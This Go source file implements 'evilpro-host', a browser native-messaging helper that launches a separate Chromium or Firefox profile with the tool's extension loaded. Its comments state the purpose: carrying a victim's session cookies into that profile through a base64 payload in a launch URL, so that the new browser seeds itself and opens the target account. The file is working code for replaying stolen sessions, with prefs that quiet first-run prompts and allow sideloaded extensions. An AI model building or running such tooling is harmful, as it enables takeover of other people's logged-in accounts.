// Command evilpro-host is a browser native-messaging host.
//
// Why it exists: an extension cannot create a browser profile. It can only open
// windows inside the profile it already lives in (plus, when it runs spanning, the
// private store). A genuinely independent profile needs a new browser process with
// its own --user-data-dir, and launching a process needs something outside the
// browser. This is that something.
//
// A launched profile is only useful if the victim's cookies get into it. The
// extension cannot write them across profiles, so the host passes the whole
// session in the launch URL: the new browser is started with --load-extension
// pointing at this extension (so the same code is running in the new profile, with
// a stable extension id baked into the manifest), and the URL is that extension's
// paste page carrying the session in its fragment. The new profile therefore seeds
// itself, then opens the target.
//
// Chromium family only: Firefox has no --load-extension equivalent.
package main

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
)

type config struct {
	Browser       string `json:"browser"`
	ExtensionsDir string `json:"extensionPath"`
	ProfilesDir   string `json:"profilesDir"`
	// ForceProfile turns on the Firefox profile path. Firefox has no
	// --load-extension, so the extension has to be picked up by Firefox's own
	// profile sideload. That worked historically but did not fire on Firefox
	// 158 in testing, so it is off by default and this is the escape hatch.
	ForceProfile bool `json:"forceProfile"`
}

type request struct {
	Action      string `json:"action"`
	Name        string `json:"name"`
	URL         string `json:"url"`
	BrowserHint string `json:"browserHint"`
	Payload     string `json:"payload"` // base64url JSON, opaque to the host
}

type response struct {
	OK         bool     `json:"ok"`
	Error      string   `json:"error,omitempty"`
	Browser    string   `json:"browser,omitempty"`
	Family     string   `json:"family,omitempty"`
	CanProfile bool     `json:"canProfile"`
	ExtPath    string   `json:"extPath,omitempty"`
	ExtID      string   `json:"extId,omitempty"`
	Profile    string   `json:"profile,omitempty"`
	Pid        int      `json:"pid,omitempty"`
	Profiles   []string `json:"profiles,omitempty"`
}

func exeDir() string {
	if exe, err := os.Executable(); err == nil {
		return filepath.Dir(exe)
	}
	wd, _ := os.Getwd()
	return wd
}

func loadConfig() config {
	var c config
	b, err := os.ReadFile(filepath.Join(exeDir(), "host.json"))
	if err == nil {
		_ = json.Unmarshal(b, &c)
	}
	if c.ExtensionsDir == "" {
		// host lives in <extension>/host/bin/ or <extension>/host/
		d := exeDir()
		if filepath.Base(d) == "bin" {
			c.ExtensionsDir = filepath.Dir(filepath.Dir(d))
		} else {
			c.ExtensionsDir = filepath.Dir(d)
		}
		// ...but only a directory holding manifest.json is the extension
		if !fileExists(filepath.Join(c.ExtensionsDir, "manifest.json")) {
			for _, cand := range []string{filepath.Dir(d), d} {
				if fileExists(filepath.Join(cand, "manifest.json")) {
					c.ExtensionsDir = cand
					break
				}
			}
		}
	}
	if c.ProfilesDir == "" {
		base, err := os.UserConfigDir()
		if err != nil {
			base = exeDir()
		}
		c.ProfilesDir = filepath.Join(base, "evil-pro", "profiles")
	}
	return c
}

func fileExists(p string) bool {
	st, err := os.Stat(p)
	return err == nil && !st.IsDir()
}

var slugRe = regexp.MustCompile(`[^A-Za-z0-9._@-]+`)

func slug(name string) string {
	s := slugRe.ReplaceAllString(strings.TrimSpace(name), "-")
	s = strings.Trim(s, "-.")
	if s == "" {
		s = "session"
	}
	if len(s) > 60 {
		s = s[:60]
	}
	return strings.ToLower(s)
}

// findBrowser honours an explicit config path, then the browser the extension is
// running in, then any known Chromium-family binary.
func findBrowser(cfg config, hint string) (string, error) {
	if cfg.Browser != "" && fileExists(cfg.Browser) {
		return cfg.Browser, nil
	}
	var names []string
	switch strings.ToLower(hint) {
	case "brave":
		names = []string{"brave", "brave-browser", "brave.exe"}
	case "edge":
		names = []string{"msedge", "msedge.exe", "microsoft-edge"}
	case "firefox":
		names = []string{"firefox", "firefox.exe", "firefox-esr", "librewolf", "waterfox"}
	default:
		names = []string{"chrome", "chrome.exe", "google-chrome", "google-chrome-stable", "chromium", "chromium-browser", "brave", "brave.exe", "msedge", "msedge.exe"}
	}
	if p := lookNames(names); p != "" {
		return p, nil
	}
	if strings.EqualFold(hint, "firefox") {
		if p := firefoxFromRegistry(); p != "" {
			return p, nil
		}
	}
	return registryBrowser(hint)
}

func firefoxFromRegistry() string {
	if runtime.GOOS != "windows" {
		return ""
	}
	for _, root := range []string{"HKLM", "HKCU"} {
		out, err := exec.Command("reg", "query",
			root+`\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\firefox.exe`, "/ve").Output()
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(out), "\n") {
			if i := strings.Index(line, "REG_SZ"); i >= 0 {
				if p := strings.TrimSpace(line[i+len("REG_SZ"):]); fileExists(p) {
					return p
				}
			}
		}
	}
	return ""
}

func lookNames(names []string) string {
	for _, n := range names {
		if p, err := exec.LookPath(n); err == nil {
			return p
		}
	}
	return ""
}

func registryBrowser(hint string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("no chromium-family browser found on PATH")
	}
	exes := []string{"chrome.exe", "brave.exe", "msedge.exe"}
	if strings.EqualFold(hint, "brave") {
		exes = []string{"brave.exe", "chrome.exe", "msedge.exe"}
	} else if strings.EqualFold(hint, "edge") {
		exes = []string{"msedge.exe", "chrome.exe", "brave.exe"}
	}
	for _, exe := range exes {
		for _, root := range []string{"HKLM", "HKCU"} {
			key := root + `\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\` + exe
			out, err := exec.Command("reg", "query", key, "/ve").Output()
			if err != nil {
				continue
			}
			for _, line := range strings.Split(string(out), "\n") {
				i := strings.Index(line, "REG_SZ")
				if i < 0 {
					continue
				}
				p := strings.TrimSpace(line[i+len("REG_SZ"):])
				if fileExists(p) {
					return p, nil
				}
			}
		}
	}
	return "", fmt.Errorf("no chromium-family browser found (set \"browser\" in host.json)")
}

func readMsg(r io.Reader) ([]byte, error) {
	var n uint32
	if err := binary.Read(r, binary.LittleEndian, &n); err != nil {
		return nil, err
	}
	if n == 0 || n > 64*1024*1024 {
		return nil, fmt.Errorf("bad message length %d", n)
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(r, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func writeMsg(w io.Writer, v interface{}) error {
	b, err := json.Marshal(v)
	if err != nil {
		return err
	}
	if err := binary.Write(w, binary.LittleEndian, uint32(len(b))); err != nil {
		return err
	}
	_, err = w.Write(b)
	return err
}

func main() {
	cfg := loadConfig()

	// Command-line mode, so installers and humans can use the same actions.
	if len(os.Args) > 1 {
		var resp response
		switch os.Args[1] {
		case "install":
			resp = install(cfg)
		case "ping":
			if b, err := findBrowser(cfg, ""); err != nil {
				resp = response{Error: err.Error()}
			} else {
				resp = response{OK: true, Browser: b, Family: family(b), CanProfile: !isFirefox(b) || cfg.ForceProfile, ExtPath: cfg.ExtensionsDir, ExtID: extID(cfg)}
			}
		case "list":
			resp = listProfiles(cfg)
		default:
			fmt.Fprintln(os.Stderr, "usage: evilpro-host [install|ping|list]")
			os.Exit(2)
		}
		out, _ := json.MarshalIndent(resp, "", "  ")
		fmt.Println(string(out))
		if !resp.OK && resp.Error != "" {
			os.Exit(1)
		}
		return
	}

	for {
		raw, err := readMsg(os.Stdin)
		if err != nil {
			return
		}
		var req request
		if err := json.Unmarshal(raw, &req); err != nil {
			_ = writeMsg(os.Stdout, response{Error: err.Error()})
			continue
		}

		var resp response
		switch req.Action {
		case "ping":
			b, err := findBrowser(cfg, req.BrowserHint)
			if err != nil {
				resp = response{Error: err.Error()}
				break
			}
			resp = response{OK: true, Browser: b, Family: family(b), CanProfile: !isFirefox(b) || cfg.ForceProfile, ExtPath: cfg.ExtensionsDir, ExtID: extID(cfg)}
		case "launch":
			resp = launch(cfg, req)
		case "list":
			resp = listProfiles(cfg)
		case "install":
			resp = install(cfg)
		default:
			resp = response{Error: "unknown action: " + req.Action}
		}
		if err := writeMsg(os.Stdout, resp); err != nil {
			return
		}
	}
}

// extID is the extension id derived from the manifest "key": the first 32 hex
// chars of SHA256(SPKI) with each nibble mapped 0-f -> a-p.
func extID(cfg config) string {
	raw, err := os.ReadFile(filepath.Join(cfg.ExtensionsDir, "manifest.json"))
	if err != nil {
		return ""
	}
	var m struct {
		Key string `json:"key"`
	}
	if json.Unmarshal(raw, &m) != nil || m.Key == "" {
		return ""
	}
	der, err := base64.StdEncoding.DecodeString(m.Key)
	if err != nil {
		return ""
	}
	hexs := fmt.Sprintf("%x", sha256.Sum256(der))[:32]
	var b strings.Builder
	for _, ch := range hexs {
		v := int(ch - '0')
		if ch >= 'a' {
			v = int(ch-'a') + 10
		}
		b.WriteByte(byte('a' + v))
	}
	return b.String()
}

func isFirefox(browser string) bool {
	return strings.Contains(strings.ToLower(filepath.Base(browser)), "firefox")
}

// family names the browser engine, so the caller can tell Firefox from Chromium.
func family(browser string) string {
	if isFirefox(browser) {
		return "firefox"
	}
	return "chromium"
}

// firefoxUUID mirrors Firefox's own add-on id -> uuid mapping (XPIDatabase
// generateUUID): sha256 of the id, formatted as a v4-shaped uuid.
func firefoxUUID(id string) string {
	sum := sha256.Sum256([]byte(id))
	h := hex.EncodeToString(sum[:])
	b16 := func(i int) int {
		v := int(h[i] - '0')
		if h[i] >= 'a' {
			v = int(h[i]-'a') + 10
		}
		return v
	}
	variant := "89ab"[b16(16)&0x3]
	return h[0:8] + "-" + h[8:12] + "-4" + h[13:16] + "-" +
		string(variant) + h[17:20] + "-" + h[20:32]
}

// firstRunPrefs keeps a brand new profile quiet.
const firstRunPrefs = `user_pref("browser.shell.checkDefaultBrowser", false);
user_pref("browser.startup.homepage_override.mstone", "ignore");
user_pref("browser.aboutwelcome.enabled", false);
user_pref("datareporting.policy.dataSubmissionEnabled", false);
user_pref("toolkit.telemetry.enabled", false);
user_pref("extensions.autoDisableScopes", 0);
user_pref("extensions.enabledScopes", 15);
`

// launchFirefox starts a separate Firefox profile. Firefox has no
// --load-extension, so the extension is placed in the new profile through a
// "proxy file": a text file named after the add-on id whose contents is the path
// to the unpacked extension. Firefox loads it at startup.
func launchFirefox(cfg config, req request, browser string) response {
	name := slug(req.Name)
	dir := filepath.Join(cfg.ProfilesDir, name)
	extDir := filepath.Join(dir, "extensions")
	if err := os.MkdirAll(extDir, 0o755); err != nil {
		return response{Error: err.Error()}
	}
	if err := os.WriteFile(filepath.Join(extDir, geckoID), []byte(cfg.ExtensionsDir), 0o644); err != nil {
		return response{Error: err.Error()}
	}
	_ = os.WriteFile(filepath.Join(dir, "user.js"), []byte(firstRunPrefs), 0o644)

	url := req.URL
	if req.Payload != "" {
		url = fmt.Sprintf("moz-extension://%s/paste.html#p=%s", firefoxUUID(geckoID), req.Payload)
	}
	args := []string{"--profile", dir, "--no-remote", "--new-instance", url}
	if len(url) > 30000 {
		return response{Error: "session too large for a launch URL"}
	}

	cmd := exec.Command(browser, args...)
	detach(cmd)
	if err := cmd.Start(); err != nil {
		return response{Error: err.Error()}
	}
	go func() { _ = cmd.Wait() }()
	return response{OK: true, Browser: browser, Profile: dir, Pid: cmd.Process.Pid}
}

func launch(cfg config, req request) response {
	browser, err := findBrowser(cfg, req.BrowserHint)
	if err != nil {
		return response{Error: err.Error()}
	}
	if cfg.ExtensionsDir == "" || !fileExists(filepath.Join(cfg.ExtensionsDir, "manifest.json")) {
		return response{Error: "extension folder not found near host.json"}
	}
	if isFirefox(browser) {
		return launchFirefox(cfg, req, browser)
	}
	id := extID(cfg)
	if id == "" {
		return response{Error: "could not read the extension key from manifest.json"}
	}
	name := slug(req.Name)
	dir := filepath.Join(cfg.ProfilesDir, name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return response{Error: err.Error()}
	}

	url := req.URL
	if req.Payload != "" {
		url = fmt.Sprintf("chrome-extension://%s/paste.html#p=%s", id, req.Payload)
	}
	if len(url) > 30000 {
		// the OS command line is capped around 32k on Windows
		return response{Error: "session too large for a launch URL"}
	}

	args := []string{
		"--user-data-dir=" + dir,
		"--load-extension=" + cfg.ExtensionsDir,
		"--no-first-run",
		"--no-default-browser-check",
		"--restore-last-session=false",
		url,
	}
	cmd := exec.Command(browser, args...)
	detach(cmd)
	if err := cmd.Start(); err != nil {
		return response{Error: err.Error()}
	}
	go func() { _ = cmd.Wait() }()
	return response{OK: true, Browser: browser, Profile: dir, Pid: cmd.Process.Pid}
}

func listProfiles(cfg config) response {
	ents, err := os.ReadDir(cfg.ProfilesDir)
	if err != nil {
		return response{OK: true}
	}
	var out []string
	for _, e := range ents {
		if e.IsDir() {
			out = append(out, e.Name())
		}
	}
	sort.Strings(out)
	return response{OK: true, Profiles: out}
}
